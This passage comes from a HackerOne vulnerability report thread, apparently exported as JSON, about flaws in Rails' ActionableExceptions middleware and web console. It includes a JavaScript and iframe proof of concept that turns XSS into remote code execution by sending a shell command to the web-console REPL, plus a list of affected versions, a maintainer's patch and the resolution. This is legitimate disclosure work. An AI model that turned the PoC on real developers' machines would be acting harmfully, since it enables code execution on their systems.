UAcnQqwd7ZcEJ7tGOzWQF%2BJot83YJ8JCzHEMxhl2LU%2F0YJcbPoth69auXP8wEPzX2DHDgHxtnnIFnJ7h%2B4wD%2FTBqDNIETiU2WW8Ob9t0Zs2iUxD2lI0uOCEk4VJMxTio93bdaLG0Cqp%2FsW8lf0i8K%2FidJBgsA1ot5if4EPj5GsJP1ha%2BDrqfU1OPLXLgEerUYAAWbHcGQOw1wjhp%2FQto2Op32UfzJwe1sq3HWqGyEa4L8s6I5ZGerD0JkUyXNQfMagBxQbG%2F50bbeTa%2F5q1laxcg0mB0AWThwG2y8HFFzrMyHoDfXL9iVBL2AuI%2FQDZ2RQMMSSq%2F8FOusBTEdo884p95XUeJQfuG1%2BgTLLaqVoYv81fOpIhbdBUDobBmrKTkhHdApg0IpS%2Fmn%2FQFTO2whPecmg5pGV5XOL1b%2B8atqSJJyBMIlcat39%2Fiw8998Wyo8KiVjdgzHFjwlEAiOS8qICceyxSIMCo8GBoYMUw94x3fGxeAXRgVqeyIErabkA8MSj9Rgz1QonRErPS3nuhkrc1lcEtwZYHvorWyjM1lTHvoGCzNSk%2F194BT4g8N2vxEy6S1dD6EiNpxPG4MaDwpuQBWRwL0Te7R5iox%2B0JLPR8s2xdgRZInm7WgUjUF8HQEmcy%2FsTmQ%3D%3D\u0026amp;X-Amz-Signature=db9289826de01cb0b793c4885bcc033491d04f3b2a1141f2b74f315d08af400f\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch3 id=\"xss-to-rce\"\u003eXSS to RCE\u003c/h3\u003e\n\n\u003cp\u003eWhen XSS exists in development mode, I confirmed that calling the method of web-cosole leads to RCE.\u003cbr\u003e\nRCE is possible by inducing users who are developing Rails applications to click on the trap site.\u003c/p\u003e\n\n\u003ch4 id=\"poc\"\u003ePoC\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eiframe\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ecreateElement\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eiframe\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nx\"\u003eiframe\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esrc\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e/not_found\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ebody\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eappendChild\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eiframe\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nx\"\u003esetTimeout\u003c/span\u003e\u003cspan class=\"p\"\u003e(()\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e\u003cspan class=\"nx\"\u003efetch\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e/__web_console/repl_sessions/\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003eiframe\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003econtentDocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003equerySelector\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e#console\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003edataset\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esessionId\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"na\"\u003emethod\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ePUT\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"na\"\u003eheaders\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eContent-Type\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eapplication/json\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n        \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eX-Requested-With\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eXMLHttpRequest\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e},\u003c/span\u003e\n    \u003cspan class=\"na\"\u003ebody\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nx\"\u003eJSON\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003estringify\u003c/span\u003e\u003cspan class=\"p\"\u003e({\u003c/span\u003e\n        \u003cspan class=\"na\"\u003einput\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e`touch from_web_console`\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e})\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}),\u003c/span\u003e \u003cspan class=\"mi\"\u003e2000\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;iframe\u003c/span\u003e \u003cspan class=\"na\"\u003esrc=\u003c/span\u003e\u003cspan class=\"s\"\u003e./child.html\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;var iframe = document.createElement(\u0026quot;iframe\u0026quot;);iframe.src = \u0026quot;/not_found\u0026quot;;document.body.appendChild(iframe);setTimeout(()=\u0026gt; fetch(\u0026quot;/__web_console/repl_sessions/\u0026quot;+iframe.contentDocument.querySelector(\u0026quot;#console\u0026quot;).dataset.sessionId, {method: \u0026quot;PUT\u0026quot;,headers: {\u0026quot;Content-Type\u0026quot;: \u0026quot;application/json\u0026quot;,\u0026quot;X-Requested-With\u0026quot;: \u0026quot;XMLHttpRequest\u0026quot;},body: JSON.stringify({input: \u0026quot;`touch from_web_console`\u0026quot;})}),2000)\u0026#39;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWhen this is run, a file from \u003ccode\u003efrom_web_console\u003c/code\u003e will be generated.\u003c/p\u003e\n\n\u003chr\u003e\n\n\u003ch3 id=\"vulnerabilities-and-conditions\"\u003eVulnerabilities and conditions\u003c/h3\u003e\n\n\u003ch4 id=\"run-pending-migrations-cve-2020-8185\"\u003eRun pending migrations (CVE-2020-8185)\u003c/h4\u003e\n\n\u003cp\u003eserver: any\u003c/p\u003e\n\n\u003cp\u003eRails version: 6.0.0 \u0026lt; rails \u0026lt; 6.0.3.2\u003cbr\u003e\nRAILS_ENV: production\u003c/p\u003e\n\n\u003ch4 id=\"run-pending-migrations-by-csrf\"\u003eRun pending migrations by CSRF\u003c/h4\u003e\n\n\u003cp\u003eserver: any\u003c/p\u003e\n\n\u003cp\u003eRails version: 6.0.0 \u0026lt; (not fixed)\u003cbr\u003e\nRAILS_ENV: development\u003c/p\u003e\n\n\u003ch4 id=\"open-redirect-from-post-method\"\u003eOpen redirect (from POST method)\u003c/h4\u003e\n\n\u003cp\u003eserver: any\u003c/p\u003e\n\n\u003cp\u003eRails version: 6.0.0 \u0026lt; rails \u0026lt; 6.0.3.2\u003cbr\u003e\nRAILS_ENV: production\u003c/p\u003e\n\n\u003cp\u003eor\u003c/p\u003e\n\n\u003cp\u003eRails version: 6.0.0 \u0026lt; (not fixed)\u003cbr\u003e\nRAILS_ENV: development\u003c/p\u003e\n\n\u003ch4 id=\"http-header-injection\"\u003eHTTP header injection\u003c/h4\u003e\n\n\u003cp\u003eserver: unicorn (\u0026lt;= latest) or puma (\u0026lt; 4.3.2)\u003c/p\u003e\n\n\u003cp\u003eRails version: 6.0.0 \u0026lt; rails \u0026lt; 6.0.3.2\u003cbr\u003e\nRAILS_ENV: production\u003c/p\u003e\n\n\u003cp\u003eor \u003c/p\u003e\n\n\u003cp\u003eRails version: 6.0.0 \u0026lt; (not fixed)\u003cbr\u003e\nRAILS_ENV: development\u003c/p\u003e\n\n\u003ch4 id=\"xss-need-user-click\"\u003eXSS (need user click)\u003c/h4\u003e\n\n\u003cp\u003eserver: unicorn (\u0026lt;= latest) or puma (\u0026lt;= latest)\u003c/p\u003e\n\n\u003cp\u003eRailse version: 6.0.0 \u0026lt; rails \u0026lt; 6.0.3.2\u003cbr\u003e\nRAILS_ENV: production \u003c/p\u003e\n\n\u003cp\u003eor \u003c/p\u003e\n\n\u003cp\u003eRailse version: 6.0.0 \u0026lt; (not fixed)\u003cbr\u003e\nRAILS_ENV: development\u003c/p\u003e\n\n\u003ch4 id=\"rce-from-xss\"\u003eRCE (from XSS)\u003c/h4\u003e\n\n\u003cp\u003eserver: unicorn (\u0026lt;= latest) or puma (\u0026lt;= latest)\u003cbr\u003e\nRailse version: 6.0.0 \u0026lt; (not fixed)\u003cbr\u003e\nRAILS_ENV: development\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-15T12:39:01.561Z","updated_at":"2020-08-15T12:39:01.561Z","actor":{"username":"ooooooo_q","cleared":false,"url":"/ooooooo_q","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":949989,"filename":"__________2020-08-15_21.23.22.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/McnWNtpfs7FVXQSKwpqLdF5e?response-content-disposition=attachment%3B%20filename%3D%22__________2020-08-15_21.23.22.png%22%3B%20filename%2A%3DUTF-8%27%27__________2020-08-15_21.23.22.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWNRUTH42%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070920Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDcXnaGBkilw8dIKZyXl6DRxz9df9dptFudyUshXKqyWAIgSXT73ENLhDU6dLXYGFlV10idtU9V2hyklLccKQ0pfc4qtAMIVxABGgwwMTM2MTkyNzQ4NDkiDKv2f94JRMR8IDO%2BDSqRA%2BK92cStxN8BDvQvva7qLjZYQ%2Bo98Fq3WIsgdmuFbIWsVJNwAy9k36tIyEf3m3YkkPzTJYVMwITIBEkRL7L4%2FFE2VrmH%2FyWnGeYlz1087dpv%2F8n%2BxePAsT9JNIFo5HL3qLY3wx5zNeJGSe7ackrU2%2B4TZ8z8qbQZZubLBkMOYL7lOQXDjEYLq5BtfLJIwgsBRHC2NLNyq6BdOntSBGR32vUAcnQqwd7ZcEJ7tGOzWQF%2BJot83YJ8JCzHEMxhl2LU%2F0YJcbPoth69auXP8wEPzX2DHDgHxtnnIFnJ7h%2B4wD%2FTBqDNIETiU2WW8Ob9t0Zs2iUxD2lI0uOCEk4VJMxTio93bdaLG0Cqp%2FsW8lf0i8K%2FidJBgsA1ot5if4EPj5GsJP1ha%2BDrqfU1OPLXLgEerUYAAWbHcGQOw1wjhp%2FQto2Op32UfzJwe1sq3HWqGyEa4L8s6I5ZGerD0JkUyXNQfMagBxQbG%2F50bbeTa%2F5q1laxcg0mB0AWThwG2y8HFFzrMyHoDfXL9iVBL2AuI%2FQDZ2RQMMSSq%2F8FOusBTEdo884p95XUeJQfuG1%2BgTLLaqVoYv81fOpIhbdBUDobBmrKTkhHdApg0IpS%2Fmn%2FQFTO2whPecmg5pGV5XOL1b%2B8atqSJJyBMIlcat39%2Fiw8998Wyo8KiVjdgzHFjwlEAiOS8qICceyxSIMCo8GBoYMUw94x3fGxeAXRgVqeyIErabkA8MSj9Rgz1QonRErPS3nuhkrc1lcEtwZYHvorWyjM1lTHvoGCzNSk%2F194BT4g8N2vxEy6S1dD6EiNpxPG4MaDwpuQBWRwL0Te7R5iox%2B0JLPR8s2xdgRZInm7WgUjUF8HQEmcy%2FsTmQ%3D%3D\u0026X-Amz-Signature=db9289826de01cb0b793c4885bcc033491d04f3b2a1141f2b74f315d08af400f"},{"id":949988,"filename":"__________2020-08-15_21.23.13.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/eQhM4PCpDtvnNg2PcTKDPUt2?response-content-disposition=attachment%3B%20filename%3D%22__________2020-08-15_21.23.13.png%22%3B%20filename%2A%3DUTF-8%27%27__________2020-08-15_21.23.13.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWNRUTH42%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070920Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDcXnaGBkilw8dIKZyXl6DRxz9df9dptFudyUshXKqyWAIgSXT73ENLhDU6dLXYGFlV10idtU9V2hyklLccKQ0pfc4qtAMIVxABGgwwMTM2MTkyNzQ4NDkiDKv2f94JRMR8IDO%2BDSqRA%2BK92cStxN8BDvQvva7qLjZYQ%2Bo98Fq3WIsgdmuFbIWsVJNwAy9k36tIyEf3m3YkkPzTJYVMwITIBEkRL7L4%2FFE2VrmH%2FyWnGeYlz1087dpv%2F8n%2BxePAsT9JNIFo5HL3qLY3wx5zNeJGSe7ackrU2%2B4TZ8z8qbQZZubLBkMOYL7lOQXDjEYLq5BtfLJIwgsBRHC2NLNyq6BdOntSBGR32vUAcnQqwd7ZcEJ7tGOzWQF%2BJot83YJ8JCzHEMxhl2LU%2F0YJcbPoth69auXP8wEPzX2DHDgHxtnnIFnJ7h%2B4wD%2FTBqDNIETiU2WW8Ob9t0Zs2iUxD2lI0uOCEk4VJMxTio93bdaLG0Cqp%2FsW8lf0i8K%2FidJBgsA1ot5if4EPj5GsJP1ha%2BDrqfU1OPLXLgEerUYAAWbHcGQOw1wjhp%2FQto2Op32UfzJwe1sq3HWqGyEa4L8s6I5ZGerD0JkUyXNQfMagBxQbG%2F50bbeTa%2F5q1laxcg0mB0AWThwG2y8HFFzrMyHoDfXL9iVBL2AuI%2FQDZ2RQMMSSq%2F8FOusBTEdo884p95XUeJQfuG1%2BgTLLaqVoYv81fOpIhbdBUDobBmrKTkhHdApg0IpS%2Fmn%2FQFTO2whPecmg5pGV5XOL1b%2B8atqSJJyBMIlcat39%2Fiw8998Wyo8KiVjdgzHFjwlEAiOS8qICceyxSIMCo8GBoYMUw94x3fGxeAXRgVqeyIErabkA8MSj9Rgz1QonRErPS3nuhkrc1lcEtwZYHvorWyjM1lTHvoGCzNSk%2F194BT4g8N2vxEy6S1dD6EiNpxPG4MaDwpuQBWRwL0Te7R5iox%2B0JLPR8s2xdgRZInm7WgUjUF8HQEmcy%2FsTmQ%3D%3D\u0026X-Amz-Signature=c5f00000bd45c50950c171d48e3a504f70deb057bdcd0863505cd51da4172e40"}],"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9006952,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2020-08-22T02:16:14.347Z","updated_at":"2020-08-22T02:16:14.347Z","additional_data":{"old_severity":null,"new_severity":"High","old_severity_id":null,"new_severity_id":825532},"actor":{"username":"ooooooo_q","cleared":false,"url":"/ooooooo_q","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9103657,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"\u003e When I tried it, puma and unicorn can insert only the character of \\r, and it seems that \\n cannot be inserted.\n\nMakes sense.  This seems like a security vulnerability in Puma / Unicorn.\n\n\u003e This is a separate issue from HTTP header injection and depends on how the server handles the value of \\r.\n\nI'm not sure exactly which servers are vulnerable (this is too confusing for me 😔), but whatever handles generating the response page shouldn't allow `\\r` at the beginning of the href like that.\n\nSo [this](https://github.com/rails/rails/blob/master/actionpack/lib/action_dispatch/middleware/actionable_exceptions.rb#L30) needs to check that `location` is a url (http or https).\n\nI don't think we need to set the security policy for the redirect page if we prevent the `javascript:` location from the href.\n\nHow does this patch look?\n\n```diff\ndiff --git a/actionpack/lib/action_dispatch/middleware/actionable_exceptions.rb b/actionpack/lib/action_dispatch/middleware/actionable_exceptions.rb\nindex 266fd92ce9..1593ca22d0 100644\n--- a/actionpack/lib/action_dispatch/middleware/actionable_exceptions.rb\n+++ b/actionpack/lib/action_dispatch/middleware/actionable_exceptions.rb\n@@ -1,6 +1,7 @@\n # frozen_string_literal: true\n \n require \"erb\"\n+require \"uri\"\n require \"action_dispatch/http/request\"\n require \"active_support/actionable_error\"\n \n@@ -27,7 +28,13 @@ def actionable_request?(request)\n       end\n \n       def redirect_to(location)\n-        body = \"\u003chtml\u003e\u003cbody\u003eYou are being \u003ca href=\\\"#{ERB::Util.unwrapped_html_escape(location)}\\\"\u003eredirected\u003c/a\u003e.\u003c/body\u003e\u003c/html\u003e\"\n+        uri = URI.parse location\n+\n+        if uri.relative? || uri.scheme == \"http\" || uri.scheme == \"https\"\n+          body = \"\u003chtml\u003e\u003cbody\u003eYou are being \u003ca href=\\\"#{ERB::Util.unwrapped_html_escape(location)}\\\"\u003eredirected\u003c/a\u003e.\u003c/body\u003e\u003c/html\u003e\"\n+        else\n+          return [400, {\"Content-Type\" =\u003e \"text/plain\"}, [\"Invalid redirection URI\"]]\n+        end\n \n         [302, {\n           \"Content-Type\" =\u003e \"text/html; charset=#{Response.default_charset}\",\n```\n\nI don't think we need to fix the open redirect as a security issue (maybe we can fix it on the public tracker), but this does seem like a security issue we need to fix.","markdown_message":"\u003cblockquote\u003e\n\u003cp\u003eWhen I tried it, puma and unicorn can insert only the character of \\r, and it seems that \\n cannot be inserted.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eMakes sense.  This seems like a security vulnerability in Puma / Unicorn.\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eThis is a separate issue from HTTP header injection and depends on how the server handles the value of \\r.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eI\u0026#39;m not sure exactly which servers are vulnerable (this is too confusing for me 😔), but whatever handles generating the response page shouldn\u0026#39;t allow \u003ccode\u003e\\r\u003c/code\u003e at the beginning of the href like that.\u003c/p\u003e\n\n\u003cp\u003eSo \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Frails%2Frails%2Fblob%2Fmaster%2Factionpack%2Flib%2Faction_dispatch%2Fmiddleware%2Factionable_exceptions.rb%23L30\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ethis\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e needs to check that \u003ccode\u003elocation\u003c/code\u003e is a url (http or https).\u003c/p\u003e\n\n\u003cp\u003eI don\u0026#39;t think we need to set the security policy for the redirect page if we prevent the \u003ccode\u003ejavascript:\u003c/code\u003e location from the href.\u003c/p\u003e\n\n\u003cp\u003eHow does this patch look?\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight diff\"\u003e\u003ccode\u003e\u003cspan class=\"gh\"\u003ediff --git a/actionpack/lib/action_dispatch/middleware/actionable_exceptions.rb b/actionpack/lib/action_dispatch/middleware/actionable_exceptions.rb\nindex 266fd92ce9..1593ca22d0 100644\n\u003c/span\u003e\u003cspan class=\"gd\"\u003e--- a/actionpack/lib/action_dispatch/middleware/actionable_exceptions.rb\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+++ b/actionpack/lib/action_dispatch/middleware/actionable_exceptions.rb\n\u003c/span\u003e\u003cspan class=\"p\"\u003e@@ -1,6 +1,7 @@\u003c/span\u003e\n # frozen_string_literal: true\n\n require \u0026quot;erb\u0026quot;\n\u003cspan class=\"gi\"\u003e+require \u0026quot;uri\u0026quot;\n\u003c/span\u003e require \u0026quot;action_dispatch/http/request\u0026quot;\n require \u0026quot;active_support/actionable_error\u0026quot;\n\n@@ -27,7 +28,13 @@ def actionable_request?(request)\n       end\n\n       def redirect_to(location)\n\u003cspan class=\"gd\"\u003e-        body = \u0026quot;\u0026lt;html\u0026gt;\u0026lt;body\u0026gt;You are being \u0026lt;a href=\\\u0026quot;#{ERB::Util.unwrapped_html_escape(location)}\\\u0026quot;\u0026gt;redirected\u0026lt;/a\u0026gt;.\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;\u0026quot;\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+        uri = URI.parse location\n+\n+        if uri.relative? || uri.scheme == \u0026quot;http\u0026quot; || uri.scheme == \u0026quot;https\u0026quot;\n+          body = \u0026quot;\u0026lt;html\u0026gt;\u0026lt;body\u0026gt;You are being \u0026lt;a href=\\\u0026quot;#{ERB::Util.unwrapped_html_escape(location)}\\\u0026quot;\u0026gt;redirected\u0026lt;/a\u0026gt;.\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;\u0026quot;\n+        else\n+          return [400, {\u0026quot;Content-Type\u0026quot; =\u0026gt; \u0026quot;text/plain\u0026quot;}, [\u0026quot;Invalid redirection URI\u0026quot;]]\n+        end\n\u003c/span\u003e\n         [302, {\n           \u0026quot;Content-Type\u0026quot; =\u0026gt; \u0026quot;text/html; charset=#{Response.default_charset}\u0026quot;,\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eI don\u0026#39;t think we need to fix the open redirect as a security issue (maybe we can fix it on the public tracker), but this does seem like a security issue we need to fix.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-09-01T19:49:12.430Z","updated_at":"2020-09-01T19:49:12.430Z","actor":{"username":"tenderlove","cleared":false,"url":"/tenderlove","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/318/60d828744b5d16813ecbf975fdc453dc4a933f4f_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9103659,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2020-09-01T19:49:38.706Z","updated_at":"2020-09-01T19:49:38.706Z","actor":{"username":"tenderlove","cleared":false,"url":"/tenderlove","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/318/60d828744b5d16813ecbf975fdc453dc4a933f4f_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9124521,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@tenderlove \nI confirmed patch. it seems there is no problem.\n\nI have confirmed that there are XSS-enabled services using a version of Rails 6.0.3.1.\nWould it be better to report XSS to the service after the patch for that fix was announced?","markdown_message":"\u003cp\u003e\u003ca href=\"/tenderlove\"\u003e@tenderlove\u003c/a\u003e \u003cbr\u003e\nI confirmed patch. it seems there is no problem.\u003c/p\u003e\n\n\u003cp\u003eI have confirmed that there are XSS-enabled services using a version of Rails 6.0.3.1.\u003cbr\u003e\nWould it be better to report XSS to the service after the patch for that fix was announced?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-09-03T23:36:11.185Z","updated_at":"2020-09-03T23:36:11.185Z","actor":{"username":"ooooooo_q","cleared":false,"url":"/ooooooo_q","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9462922,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi @ooooooo_q,\n\nThanks again for the report. We just released a fix for this issue: https://groups.google.com/g/rubyonrails-security/c/yQzUVfv42jk. For this reason, we'll close this report as Resolved. You should expect to hear from us regarding a bounty decision within the next couple of days.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/ooooooo_q\"\u003e@ooooooo_q\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThanks again for the report. We just released a fix for this issue: \u003ca title=\"https://groups.google.com/g/rubyonrails-security/c/yQzUVfv42jk\" href=\"/redirect?url=https%3A%2F%2Fgroups.google.com%2Fg%2Frubyonrails-security%2Fc%2FyQzUVfv42jk\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://groups.google.com/g/rubyonrails-security/c/yQzUVfv42jk\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. For this reason, we\u0026#39;ll close this report as Resolved. You should expect to hear from us regarding a bounty decision within the next couple of days.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-10-08T18:46:52.568Z","updated_at":"2020-10-08T18:46:52.568Z","actor":{"username":"jack_mccracken","cleared":false,"url":"/jack_mccracken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/164/342/6543dc397b4dbb2c24dc81f92a42de654a3e6a99_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"ooooooo_q","url":"/ooooooo_q"},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9625564,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @jack_mccracken,\n\nWill it still take time to decision the bounty?\n\nRegarding the contents of the release, Is it intentional that it is not disclosed that XSS is possible even in production mode below 6.0.3.2?\nIf not, I think it's better to publish the information somewhere.\nFrom the text at the time of release of 6.0.3.2, 6.0.3.3, 6.0.3.4, I think that some users will delay the release by judging that there is no significant impact.\n(Actually, there is a version of Gitlab that still uses 6.0.3.1)","markdown_message":"\u003cp\u003eHi \u003ca 